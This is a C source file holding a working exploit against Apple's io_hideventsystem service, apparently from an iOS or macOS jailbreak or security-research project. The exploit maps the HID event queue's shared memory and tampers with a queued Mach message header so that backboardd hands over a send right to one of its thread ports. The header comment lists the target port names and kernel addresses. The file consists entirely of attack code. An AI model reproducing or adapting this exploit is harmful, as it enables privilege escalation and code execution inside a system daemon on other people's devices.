/*
 this file gets a send right to a backboardd thread port by exploiting a bug in io_hideventsystem
 
 here are the early ports, their names are stable:

 0x00000103 : 0xffffffe001464738 : 2 (IKOT_TASK)
 0x00000203 : 0xffffffe001f1e6b8 : 0 (IKOT_NONE)
 0x00000303 : 0xffffffe001f1ed48 : 0 (IKOT_NONE)
 0x00000407 : 0xffffffe00145ca80 : 1 (IKOT_THREAD)
 0x00000503 : 0xffffffe001f1d6f8 : 0 (IKOT_NONE)
 0x0000060f : 0xffffffe00219abf8 : 29 (IKOT_IOKIT_CONNECT)
 0x00000707 : 0xffffffe0012a1c38 : 0 (IKOT_NONE)
 0x00000803 : 0xffffffe000789650 : 25 (IKOT_CLOCK)
 0x00000903 : 0xffffffe001f1d500 : 23 (IKOT_SEMAPHORE)
 0x00000a03 : 0xffffffe001f1fa68 : 0 (IKOT_NONE)
 0x00000b03 : 0xffffffe001464888 : 37 (IKOT_VOUCHER)
 
 we'll target 0x407
 */

#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>

#include <CoreFoundation/CoreFoundation.h>

#include <common.h>

kern_return_t mach_vm_map(
    vm_map_t target_task,
    mach_vm_address_t* address,
    mach_vm_size_t size,
    mach_vm_offset_t mask,
    int flags,
    mem_entry_name_port_t object,
    memory_object_offset_t offset,
    boolean_t copy,
    vm_prot_t cur_protection,
    vm_prot_t max_protection,
    vm_inherit_t inheritance);

kern_return_t mach_vm_deallocate(
    vm_map_t target,
    mach_vm_address_t address,
    mach_vm_size_t size);

kern_return_t
bootstrap_look_up(mach_port_t bp, char* service_name, mach_port_t* sp);

// missing io_hideventsystem MIG prototypes, link again IOKit.framework for the symbols

kern_return_t io_hideventsystem_open(
    mach_port_t service,
    mach_port_t our_task,
    int type,
    void* bplist,
    int bplist_len,
    int zero0,
    int zero1,
    mach_port_t a_receive_right,
    mach_port_t* connection);

kern_return_t io_hideventsystem_clear_service_cache(
    mach_port_t service_connection);

kern_return_t io_hideventsystem_copy_matching_services(
    mach_port_t service_connection,
    void* matching,
    int matching_len,
    void** matching_out,
    int* matching_out_len,
    void** service_ids_out,
    int* service_ids_out_len);

kern_return_t io_hideventsystem_queue_create(
    mach_port_t service_connection,
    mach_port_t notification_port,
    int queue_size,
    mach_port_t* queue_memory_entry);

kern_return_t io_hideventsystem_queue_start(
    mach_port_t service_connection);

kern_return_t io_hideventsystem_queue_stop(
    mach_port_t service_connection);

mach_port_t hid_event_queue_exploit()
{
    kern_return_t err;

    /* connect to the com.apple.iohideventsystem service */

    mach_port_t service_port = MACH_PORT_NULL;

    err = bootstrap_look_up(bootstrap_port, "com.apple.iohideventsystem", &service_port);
    if (err != KERN_SUCCESS || service_port == MACH_PORT_NULL) {
        LOG("failed to lookup service");
        exit(EXIT_FAILURE);
    }

    LOG("got service port: 0x%x", service_port);

    /* open a client connection */

    mach_port_t a_receive_right = MACH_PORT_NULL;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &a_receive_right);
    if (err != KERN_SUCCESS) {
        LOG("failed to allocate receive right");
        exit(EXIT_FAILURE);
    }

    err = mach_port_insert_right(mach_task_self(), a_receive_right, a_receive_right, MACH_MSG_TYPE_MAKE_SEND);
    LOG("allocated a receive right 0x%x, we'll give hideventsystem a send to this", a_receive_right);

    mach_port_t connection_port = MACH_PORT_NULL;

    err = io_hideventsystem_open(
        service_port,
        mach_task_self(),
        3,
        NULL,
        0,
        0,
        0,
        a_receive_right,
        &connection_port);

    LOG("err: %x", err);
    LOG("connection_port: %x", connection_port);
    LOG("a_receive_right: %x", a_receive_right);

    if (err != KERN_SUCCESS) {
        LOG("failed to open hideventsystem connection");
        exit(EXIT_FAILURE);
    }

    /* clear the cache */
    err = io_hideventsystem_clear_service_cache(connection_port);
    if (err != KERN_SUCCESS) {
        LOG("failed to clear service cache, err: %x", err);
        exit(EXIT_FAILURE);
    }

    /* select the list of desired devices */
    void* matching_out = NULL;
    int matching_out_len = 0;
    void* service_ids_out = NULL;
    int service_ids_out_len = 0;
    err = io_hideventsystem_copy_matching_services(
        connection_port,
        NULL,
        0,
        &matching_out,
        &matching_out_len,
        &service_ids_out,
        &service_ids_out_len);

    if (err != KERN_SUCCESS) {
        LOG("failed to copy matching services, err: %x", err);
        exit(EXIT_FAILURE);
    }

    if (matching_out != NULL) {
        mach_vm_deallocate(mach_task_self(), matching_out, matching_out_len);
    }

    if (service_ids_out != NULL) {
        mach_vm_deallocate(mach_task_self(), service_ids_out, service_ids_out_len);
    }

    LOG("copied matching services");

    mach_port_t notification_port = MACH_PORT_NULL;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
    if (err != KERN_SUCCESS) {
        LOG("failed to allocate receive right for notification port");
        exit(EXIT_FAILURE);
    }

    LOG("allocated a recieve right for notifications: 0x%x", notification_port);

    mach_port_t queue_memory_entry = MACH_PORT_NULL;

    err = io_hideventsystem_queue_create(
        connection_port,
        notification_port,
        0x8000,
        &queue_memory_entry);

    if (err != KERN_SUCCESS) {
        LOG("failed to create queue, err: %x", err);
        exit(EXIT_FAILURE);
    }

    LOG("queue memory entry port: 0x%x", queue_memory_entry);

    LOG("pid %d", getpid());

    // map the queue:
    mach_vm_address_t queue_address = 0;
    err = mach_vm_map(
        mach_task_self(),
        &queue_address, // &address
        (mach_vm_size_t)0x9000, // size
        0xfff, // mask
        1, // flags
        queue_memory_entry, // object
        0, // offset
        0, // copy
        3, // cur_prot
        3, // max_prot
        2); // inheritance

    if (err != KERN_SUCCESS) {
        LOG("mach_vm_map failed: %x", err);
        exit(EXIT_FAILURE);
    }

    LOG("mapped queue: %p", (void*)queue_address);

    volatile mach_msg_header_t* shm_msg = (mach_msg_header_t*)(queue_address + 0x8000 + 0x10);

    LOG("got the shared memory msg mapped at: %p", shm_msg);
    LOG("%08x %08x %08x", shm_msg->msgh_bits, shm_msg->msgh_size, shm_msg->msgh_remote_port);
    LOG("%08x %08x %08x", shm_msg->msgh_local_port, shm_msg->msgh_voucher_port, shm_msg->msgh_id);

    uint32_t saved_bits = shm_msg->msgh_bits;
    uint32_t saved_local_port = shm_msg->msgh_local_port;
    uint32_t saved_msgh_id = shm_msg->msgh_id;

    shm_msg->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0); // remote, local, voucher
    shm_msg->msgh_local_port = 0x407; // the port we want, 0x407 is a thread port
    shm_msg->msgh_id = 0x12341234;

    // start the queue
    err = io_hideventsystem_queue_start(
        connection_port);

    if (err != KERN_SUCCESS) {
        LOG("failed to start the event queue");
    }

    LOG("started queue");

    // wait to receive a message
    LOG("if nothing happens here for a while, interact with the screen");

    mach_msg_header_t* received_msg = malloc(0x1000);

    err = mach_msg(
        received_msg,
        MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE,
        0,
        0x1000,
        notification_port,
        0,
        0);
    LOG("mach_msg returned");

    if (err != KERN_SUCCESS) {
        LOG("tried to receive a message on the notification port but failed, err: %x", err);
        exit(EXIT_FAILURE);
    }

    LOG("msgh_id of received notification message: %x", received_msg->msgh_id);
    LOG("did we get an interesting port? 0x%x", received_msg->msgh_remote_port);

    mach_port_t stolen_port = received_msg->msgh_remote_port;

    // let's get the type of that port
    natural_t ktype = 0;
    mach_vm_address_t kaddr = 0;
    err = mach_port_kobject(mach_task_self(), stolen_port, &ktype, &kaddr);
    if (err != KERN_SUCCESS) {
        LOG("unable to get mach port ktype");
        sleep(100);
    }

    LOG("kernel object type: %d", ktype);

    // is that a thread port?
    if (ktype != 1) {
        LOG("not a thread port...");
    }

    // cleanup:

    // fix up the message:
    shm_msg->msgh_bits = saved_bits;
    shm_msg->msgh_local_port = saved_local_port;
    shm_msg->msgh_id = saved_msgh_id;

    err = io_hideventsystem_queue_stop(connection_port);
    if (err != KERN_SUCCESS) {
        LOG("unable to stop the queue");
    }

    // unmap the queue
    mach_vm_deallocate(mach_task_self(), queue_address, 0x9000);

    // drop the resources:
    mach_port_deallocate(mach_task_self(), queue_memory_entry);

    mach_port_deallocate(mach_task_self(), connection_port);

    mach_port_destroy(mach_task_self(), notification_port);

    mach_port_destroy(mach_task_self(), a_receive_right);

    mach_port_deallocate(mach_task_self(), service_port);

    return stolen_port;
}
